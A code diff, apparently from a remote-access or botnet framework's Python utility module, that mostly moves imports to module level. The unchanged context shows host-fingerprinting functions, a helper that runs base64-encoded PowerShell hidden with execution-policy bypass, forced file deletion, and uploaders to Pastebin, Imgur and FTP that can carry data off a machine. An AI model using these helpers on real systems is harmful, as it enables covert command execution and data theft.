@@ -258,8 +258,6 @@ import random
 import subprocess
 import functools
 import uuid
-import sys
-import logging
 import select
 import os
 import zipfile
@@ -279,7 +277,6 @@ def log(info, level='debug'):
     Log output to the console (if verbose output is enabled)
 
     """
-    import logging
     logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
@@ -320,7 +317,6 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     :param str module:       name of the module
 
     """
-    import sys
     if sys.platform in platforms:
         return True
     log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
@@ -332,7 +328,6 @@ def platform():
     Return the system platform of host machine
 
     """
-    import sys
     return sys.platform
 
 
@@ -341,7 +336,6 @@ def public_ip():
     Return public IP address of host machine
 
     """
-    import sys
     if sys.version_info[0] > 2:
         from urllib.request import urlopen
     else:
@@ -354,7 +348,6 @@ def local_ip():
     Return local IP address of host machine
 
     """
-    import socket
     return socket.gethostbyname(socket.gethostname())
 
 
@@ -363,7 +356,6 @@ def mac_address():
     Return MAC address of host machine
 
     """
-    import uuid
     return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
 
 
@@ -372,7 +364,6 @@ def architecture():
     Check if host machine has 32-bit or 64-bit processor architecture
 
     """
-    import struct
     return int(struct.calcsize('P') * 8)
 
 
@@ -381,7 +372,6 @@ def device():
     Return the name of the host machine
 
     """
-    import socket
     return socket.getfqdn(socket.gethostname())
 
 
@@ -390,7 +380,6 @@ def username():
     Return username of current logged in user
 
     """
-    import os
     return os.getenv('USER', os.getenv('USERNAME', 'user'))
 
 
@@ -399,7 +388,6 @@ def administrator():
     Return True if current user is administrator, otherwise False
 
     """
-    import os
     import ctypes
     return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)
 
@@ -408,8 +396,6 @@ def geolocation():
     """
     Return latitute/longitude of host machine (tuple)
     """
-    import sys
-    import json
     if sys.version_info[0] > 2:
         from urllib.request import urlopen
     else:
@@ -430,7 +416,6 @@ def ipv4(address):
     Returns True if input is valid IPv4 address, otherwise False
 
     """
-    import socket
     try:
         if socket.inet_aton(str(address)):
             return True
@@ -446,7 +431,6 @@ def status(timestamp):
     :param float timestamp:   Unix timestamp (seconds since the Epoch)
 
     """
-    import time
     c = time.time() - float(timestamp)
     data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
           '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
@@ -463,8 +447,6 @@ def unzip(filename):
     :param str filename:     path to ZIP archive
 
     """
-    import os
-    import zipfile
     z = zipfile.ZipFile(filename)
     path = os.path.dirname(filename)
     z.extractall(path=path)
@@ -485,7 +467,6 @@ def post(url, headers={}, data={}, json={}, as_json=False):
 
     """
     try:
-        import requests
         req = requests.post(url, headers=headers, data=data, json=json)
         output = req.content
         if as_json:
@@ -494,7 +475,6 @@ def post(url, headers={}, data={}, json={}, as_json=False):
             except: pass
         return output
     except:
-        import sys
         if sys.version_info[0] > 2:
             from urllib.request import urlopen,urlencode,Request
         else:
@@ -506,7 +486,6 @@ def post(url, headers={}, data={}, json={}, as_json=False):
             req.headers[key] = value
         output = urlopen(req).read()
         if as_json:
-            import json
             try:
                 output = json.loads(output)
             except: pass
@@ -521,7 +500,6 @@ def normalize(source):
     :param source:   string OR readable-file
 
     """
-    import os
     if os.path.isfile(source):
         return open(source, 'rb').read()
     elif hasattr(source, 'getvalue'):
@@ -567,10 +545,6 @@ def png(image):
     Returns raw image data in PNG format
 
     """
-    import sys
-    import zlib
-    import numpy
-    import struct
 
     try:
         from StringIO import StringIO  # Python 2
@@ -624,7 +598,6 @@ def delete(target):
     :param str target:     target filename to delete
 
     """
-    import os
     import shutil
     try:
         _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
@@ -633,7 +606,6 @@ def delete(target):
         if os.path.isfile(target):
             os.remove(target)
         elif os.path.isdir(target):
-            import shutil
             shutil.rmtree(target, ignore_errors=True)
     except OSError: pass
 
@@ -678,8 +650,6 @@ def powershell(code):
     Returns any output from Powershell executing the code
 
     """
-    import os
-    import base64
     try:
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
         return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
@@ -722,7 +692,6 @@ def color():
 
     """
     try:
-        import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
         log("{} error: {}".format(color.__name__, str(e)))
@@ -733,7 +702,6 @@ def imgur(source, api_key=None):
     Upload image file/data to Imgur
 
     """
-    import base64
     if api_key:
         response = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(source)), 'type': 'base64'}, as_json=True)
         return response['data']['link'].encode()
@@ -753,7 +721,6 @@ def pastebin(source, api_key):
     :param str api_user_key:   Pastebin api_user_key
 
     """
-    import sys
     if sys.version_info[0] > 2:
         from urllib.parse import urlsplit,urlunsplit
     else:
@@ -789,9 +756,6 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     :param str filetype:  target file type (default: .txt)
 
     """
-    import os
-    import time
-    import ftplib
 
     try:
         from StringIO import StringIO  # Python 2
@@ -833,7 +797,6 @@ def config(*arg, **options):
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
 
     """
-    import functools
     def _config(function):
         @functools.wraps(function)
         def wrapper(*args, **kwargs):
@@ -852,9 +815,6 @@ def threaded(function):
     :param function:    function/method to run in a thread
 
     """
-    import time
-    import threading
-    import functools
     @functools.wraps(function)
     def _threaded(*args, **kwargs):
         t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
@@ -1143,7 +1103,6 @@ def long_to_bytes(n, blocksize=0):
     :param long n:      long integer to convert to byte string
 
     """
-    import struct
     s = b''
     n = int(n)
     while n > 0:
@@ -1168,7 +1127,6 @@ def bytes_to_long(s):
     :param str s:       byte string to convert to long integer
 
     """
-    import struct
     acc = 0
     length = len(s)
     if length % 4:
